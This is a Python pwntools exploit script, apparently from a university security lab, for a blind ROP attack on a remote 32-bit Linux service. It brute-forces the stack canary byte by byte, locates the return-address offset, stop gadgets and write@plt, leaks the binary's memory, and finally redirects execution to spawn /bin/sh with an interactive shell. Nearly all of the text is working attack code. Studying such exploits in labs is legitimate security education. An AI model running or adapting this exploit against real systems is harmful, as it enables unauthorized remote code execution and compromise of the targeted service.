from pwn import *
import code
from tqdm import tnrange

context(arch='i386', os='linux', log_level='INFO')
host_addr = '10.15.201.97'
host_port = 8090

p = remote(host_addr, host_port)
p.recvuntil("StudentID:\n")
p.sendline("3180103012")

buf_size = None
canary = None
ra_offset = None
stop_addr = None
# bgadget_addr = None
write_plt = None


def go_to_recv(timeout=pwnlib.timeout.Timeout.default):
    return p.recvuntil('[-] INPUT something darker: \n', timeout=timeout)


def get_buffer_size():
    for i in range(20):
        payload = b'A' * (i + 1)
        go_to_recv()
        p.send(payload)
        if p.recvline()[0:3] == b'[-]':
            log.info("bad buffer size: %d" % buf_size)
        else:  # Crash
            log.info("buffer size: %d" % buf_size)
            return i


def get_canary():
    canary_list = []
    for loop in range(0, 4):
        for i in range(0x100):
            payload = b'A' * buf_size
            for j in range(loop):
                payload += p8(canary_list[j])
            payload += p8(i)

            go_to_recv()
            p.send(payload)
            if p.recvline()[0:3] == b'[-]':
                canary_list.append(i)
                log.info("canary[%d] is 0x%x" % (loop, i))
                break
    return sum(canary_list[i] << (8 * i) for i in range(4))


def get_ra_offset():
    for offset in range(100, -1, -1):
        payload = b'A' * buf_size + p32(canary) + b'\0' * offset

        go_to_recv()
        p.send(payload)
        if p.recvline()[0:3] == b'[-]':
            log.info("ra offset: %d" % offset)
            return offset
        else:  # Crash
            log.info("bad ra offset: %d" % offset)


def get_stop_addr():
    stop_addr_list = []
    # for addr in range(0x80486cf, 0x80489a0):
    go_to_recv()
    for addr in range(0x80486a0, 0x80489a0):
        payload = b'A' * buf_size + p32(canary) + b'A' * ra_offset + p32(addr)

        p.send(payload)

        line = p.recvline()

        if go_to_recv(1) == b'':
            log.info("stop address: 0x%x" % addr)
            stop_addr_list.append(addr)
        #     return addr
        # else:  # Crash or not blocked
        #     log.info("bad stop address: 0x%x" % addr)
    return stop_addr_list


def get_write_plt():
    for addr in range(0x8048000, 0x8048000+0x1000):
        payload = b'A' * buf_size + p32(canary) + b'A' * ra_offset
        payload += p32(addr) + p32(stop_addr)
        payload += p32(1) + p32(0x8048000) + p32(0x1000)
        # payload += p32(stop_addr)

        go_to_recv(1)
        p.send(payload)

        tmp = p.recv(timeout=1)

        if tmp.startswith(b'\x7fELF'):
            print(tmp)
            log.info("write@plt address: 0x%x" % addr)
            return addr


def dump_memory(start_addr, end_addr):
    result = b''
    while start_addr < end_addr:
        payload = b'A' * buf_size + p32(canary) + b'A' * ra_offset
        payload += p32(write_plt) + p32(stop_addr)
        payload += p32(1) + p32(start_addr) + p32(end_addr - start_addr)

        go_to_recv()
        p.send(payload)
        data = p.recv(timeout=0.1)
        log.info("leaking: [0x%x, 0x%x] -> %s" %
                 (start_addr, start_addr + len(data), data))
        result += data
        start_addr += len(data)
    return result


'''
Stage 1
'''

# buf_size = get_buffer_size()
buf_size = 16
log.success("buf_size: 0x%x" % buf_size)

canary = get_canary()
log.success("canary: 0x%x" % canary)

# ra_offset = get_ra_offset()
ra_offset = 12
log.success("ra_offset: %d" % ra_offset)

# stop_addr_list = get_stop_addr()
# stop_addr_list = [0x80486cf, 0x8048814, 0x8048840, 0x8048841, 0x804884f, 0x8048859, 0x8048912, 0x8048914, 0x8048926, 0x8048929]
# for i in stop_addr_list:
#     print(hex(i), end=', ')
stop_addr = 0x8048814
log.success("stop_addr: 0x%x" % stop_addr)

# write_plt = get_write_plt()
write_plt = 0x8048560
log.success("write plt: 0x%x" % write_plt)

# code_bin = dump_memory(0x8048000, 0x8048000+0x1000)
# with open('crackme/code03.bin', 'wb') as f:
#     f.write(code_bin)
#     f.close()

'''
Stage 2
'''

binsh_addr = 0x08048BA8
binls_addr = 0x08048BB1

# context.log_level = 'DEBUG'

# for addr in range(0x8048500, 0x8048000+0x1000):
#     payload = b'A' * buf_size + p32(canary) + b'A' * ra_offset
#     payload += p32(addr) + p32(stop_addr)
#     payload += p32(binls_addr)

#     go_to_recv(1)
#     p.send(payload)

#     tmp = go_to_recv(1)

#     if tmp[0:3] != b'[-]' and tmp[0:3] != b'[+]':
#         log.info('0x%x %s' % (addr, tmp))

p.send(b'A' * buf_size + p32(canary) + b'A' * ra_offset +
       p32(0x8048520) + p32(stop_addr) + p32(binsh_addr))
p.interactive()

'''
Tmp methods
'''

# def get_useful_gadgets_addr():
#     useful_addr_list = []

#     go_to_recv()
#     for addr in range(0x80486a0, 0x80489a0):
#         payload = b'A' * buf_size + p32(canary) + b'A' * ra_offset + p32(addr)
#         payload += p32(stop_addr)

#         p.send(payload)

#         line = p.recvline()

#         if go_to_recv(1) == b'':
#             log.info("find useful address: 0x%x" % addr)
#             useful_addr_list.append(addr)
#         else:  # Crash or not blocked
#             log.info("bad address: 0x%x" % addr)

#     return useful_addr_list


# # <__libc_csu_init>
# def get_brop_gadgets_addr(useful_addr_list):
#     go_to_recv()
#     for addr in useful_addr_list:
#         # check if there is 4 pop
#         payload = b'A' * buf_size + \
#             p32(canary) + b'A' * ra_offset + p32(addr - 4)
#         payload += p32(1) + p32(2) + p32(3) + p32(4)
#         payload += p32(stop_addr)

#         p.send(payload)

#         line = p.recvline()

#         if go_to_recv(1) == b'':
#             log.info("brop gadget address: 0x%x" % addr)
#         else:  # Crash or not blocked
#             log.info("not brop gadget address: 0x%x" % addr)


# useful_gadgets_list = get_useful_gadgets_addr()
# useful_gadgets_list = [0x80486a0, 0x80486a4, 0x80486ce, 0x80486fa, 0x8048723, 0x804874c, 0x8048775, 0x804880c, 0x8048811, 0x8048813, 0x804883f, 0x804884f, 0x8048871, 0x8048873, 0x8048876, 0x8048878, 0x8048912, 0x8048914, 0x8048926, 0x8048929, 0x8048949]
# for i in useful_gadgets_list:
#     if i - 1 not in stop_addr_list:
#         print(hex(i), end=', ')
# useful_gadgets_list = [0x80486a0, 0x80486a4, 0x80486d0, 0x80486fa, 0x8048723, 0x804874c, 0x8048775, 0x804880c, 0x8048811, 0x8048815, 0x8048841, 0x804884f, 0x8048871, 0x8048873, 0x8048876, 0x8048878, 0x8048912, 0x8048914, 0x8048926, 0x8048929, 0x8048949]

# get_brop_gadgets_addr(useful_gadgets_list)
# bgadget_addr = 0x8048814
# log.success("bgadget_addr: 0x%x" % bgadget_addr)
